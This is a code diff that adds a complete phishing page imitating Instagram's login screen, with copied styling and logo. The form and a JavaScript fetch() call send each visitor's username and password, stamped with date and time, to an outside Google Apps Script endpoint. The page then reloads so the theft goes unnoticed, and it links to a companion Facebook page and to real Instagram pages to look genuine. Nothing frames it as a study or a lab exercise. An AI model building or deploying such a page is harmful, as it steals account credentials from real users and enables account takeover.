@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    /* Reset default margin and padding */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* Body and layout */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      width: 350px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    input:focus {
+      border-color: #4e7c9e;
+      outline: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-btn:hover {
+      background-color: #007bb5;
+    }
+
+    .divider {
+      margin: 20px 0;
+      font-weight: bold;
+      position: relative;
+      text-align: center;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .divider span {
+      display: inline-block;
+      background-color: #fafafa;
+      padding: 0 10px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .facebook-login {
+      width: 100%;
+      padding: 10px;
+      background-color: #4267B2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .facebook-login:hover {
+      background-color: #365899;
+    }
+
+    .forgot-password a {
+      color: #0095f6;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    .signup-box {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+
+    .signup-box a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+
+    <form action="https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec" method="POST" name="insta-form">
+      <input type="hidden" name="account" value="Instagram">
+      <input type="text" placeholder="Phone number, username, or email" name="username" required>
+      <input type="password" placeholder="Password" name="password" required>
+
+      <!-- Hidden input fields for date and time -->
+      <input type="hidden" name="submit_date" id="submit-date">
+      <input type="hidden" name="submit_time" id="submit-time">
+      
+      <input type="submit" class="login-btn" value="Log In" name="submit">
+    </form>
+
+    <div class="divider">
+      <span>OR</span>
+    </div>
+    <a href="facebook.html"><input type="submit" class="facebook-login" value="Log in with Facebook"></a>
+    <div class="forgot-password">
+      <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+    </div>
+    <div class="signup-box">
+      <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+    </div>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec';
+    const form = document.forms['insta-form'];
+
+    // Function to set the date and time
+    function setDateAndTime() {
+      const now = new Date();
+      const date = now.toLocaleDateString();  // Gets the current date 
+      const time = now.toLocaleTimeString();  // Gets the current time 
+
+      document.getElementById('submit-date').value = date;
+      document.getElementById('submit-time').value = time;
+    }
+
+    // Attach event listener to submit form
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      // Set the date and time before submitting
+      setDateAndTime();
+
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(() => {
+        window.location.reload();
+      })
+      .catch(error => console.error('Error!', error.message));
+    });
+  </script>
+</body>
+</html>
